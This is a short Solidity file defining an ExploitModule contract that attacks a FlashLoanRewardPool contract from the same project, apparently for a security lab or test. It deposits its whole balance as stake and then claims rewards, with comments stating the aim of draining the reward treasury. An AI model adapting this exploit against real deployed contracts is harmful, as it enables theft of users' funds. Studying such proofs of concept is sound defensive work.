// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {FlashLoanRewardPool} from "../src/FlashLoanRewardPool.sol";

contract ExploitModule {
    FlashLoanRewardPool public targetContract;

    constructor(address _target) payable {
        targetContract = FlashLoanRewardPool(payable(_target));
    }

    function runExploit() external payable {
        // Deposit stake to increase totalStaked
        targetContract.depositStake{value: address(this).balance}();

        // Claim reward to drain rewardTreasury
        targetContract.claimReward();
    }

    receive() external payable {}
}